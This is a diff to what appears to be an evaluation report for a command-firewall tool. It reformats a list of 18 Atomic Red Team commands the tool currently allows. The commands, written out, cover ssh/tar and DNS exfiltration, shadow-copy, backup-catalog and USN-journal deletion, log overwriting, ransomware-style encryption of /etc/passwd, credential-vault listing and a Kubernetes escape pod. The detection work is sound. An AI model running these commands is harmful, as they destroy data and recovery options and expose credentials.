@@ -29,28 +29,26 @@ Source: 203 commands from [Atomic Red Team](https://github.com/redcanaryco/atomi
 
 ### On-axis detection gaps (18) — attacks redstamp should catch but does not
 
-These are command-semantic attacks (redstamp's axis) that a correct firewall should block or escalate. Each is a candidate detection rule.
+These are command-semantic attacks (redstamp's axis) that a correct firewall should block or escalate. Each is a candidate detection rule. (A bulleted list, not a table, so pipes and backslashes in the commands render verbatim.)
 
-| ATT&CK | verdict now | command |
-|---|---|---|
-| T1041 | allow | `if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 1..100 \| ForEach-Object { Add-Content -Path $env:TEMP\LineNumb` |
-| T1041 | allow | `$dnsServer = "dns.example.com" $exfiltratedData = "SecretDataToExfiltrate" $chunkSize = 63 $encodedData = [Sys` |
-| T1048 | allow | `ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz` |
-| T1048 | allow | `tar czpf - /Users/* \| openssl des3 -salt -pass atomic \| ssh atomic@target.example.com 'cat > /Users.tar.gz.enc` |
-| T1070 | allow | `fsutil usn deletejournal /D C:` |
-| T1485 | allow | `dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog \| awk '{print $5}') iflag=count_bytes` |
-| T1485 | allow | `gcloud config set project atomic-test-1 gcloud storage buckets delete gs://atomic-red-team-bucket` |
-| T1486 | allow | `echo "passwd" \| $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/pa` |
-| T1486 | allow | `$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd` |
-| T1486 | allow | `which_ccencrypt=which ccencrypt cp /etc/passwd /tmp/passwd; $which_ccencrypt -T -K passwd /tmp/passwd` |
-| T1486 | allow | `which_openssl=which openssl $which_openssl genrsa -out /tmp/key.pem 2048 $which_openssl rsa -in /tmp/key.pem` |
-| T1486 | allow | `echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt` |
-| T1486 | allow | `7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt` |
-| T1490 | allow | `wbadmin delete catalog -quiet` |
-| T1490 | allow | `Get-WmiObject Win32_Shadowcopy \| ForEach-Object {$_.Delete();}` |
-| T1555 | allow | `vaultcmd /listcreds:"Windows Credentials" /all` |
-| T1555 | allow | `vaultcmd /listcreds:"Web Credentials" /all` |
-| T1611 | allow | `kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --` |
+- **T1041** (currently `allow`) — `if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumb`
+- **T1041** (currently `allow`) — `$dnsServer = "dns.example.com" $exfiltratedData = "SecretDataToExfiltrate" $chunkSize = 63 $encodedData = [Sys`
+- **T1048** (currently `allow`) — `ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz`
+- **T1048** (currently `allow`) — `tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc`
+- **T1070** (currently `allow`) — `fsutil usn deletejournal /D C:`
+- **T1485** (currently `allow`) — `dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes`
+- **T1485** (currently `allow`) — `gcloud config set project atomic-test-1 gcloud storage buckets delete gs://atomic-red-team-bucket`
+- **T1486** (currently `allow`) — `echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/pa`
+- **T1486** (currently `allow`) — `$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd`
+- **T1486** (currently `allow`) — `which_ccencrypt='which ccencrypt' cp /etc/passwd /tmp/passwd; $which_ccencrypt -T -K passwd /tmp/passwd`
+- **T1486** (currently `allow`) — `which_openssl='which openssl' $which_openssl genrsa -out /tmp/key.pem 2048 $which_openssl rsa -in /tmp/key.pem`
+- **T1486** (currently `allow`) — `echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt`
+- **T1486** (currently `allow`) — `7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt`
+- **T1490** (currently `allow`) — `wbadmin delete catalog -quiet`
+- **T1490** (currently `allow`) — `Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}`
+- **T1555** (currently `allow`) — `vaultcmd /listcreds:"Windows Credentials" /all`
+- **T1555** (currently `allow`) — `vaultcmd /listcreds:"Web Credentials" /all`
+- **T1611** (currently `allow`) — `kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --`
 
 _Themes: exfil over ssh/tar and DNS; inhibit-recovery variants (`fsutil usn deletejournal`, `wbadmin delete catalog`, WMI shadow-copy delete); ransomware-shaped encryption of system files (`gpg -c /etc/passwd`, `7z -p`, `ccencrypt`, `openssl`); `dd` overwrite of a logfile; `kubectl` privileged-pod escape; credential-store enumeration (`vaultcmd`). Closing these raises real-world recall AND a future Atomic Red Team score._
 
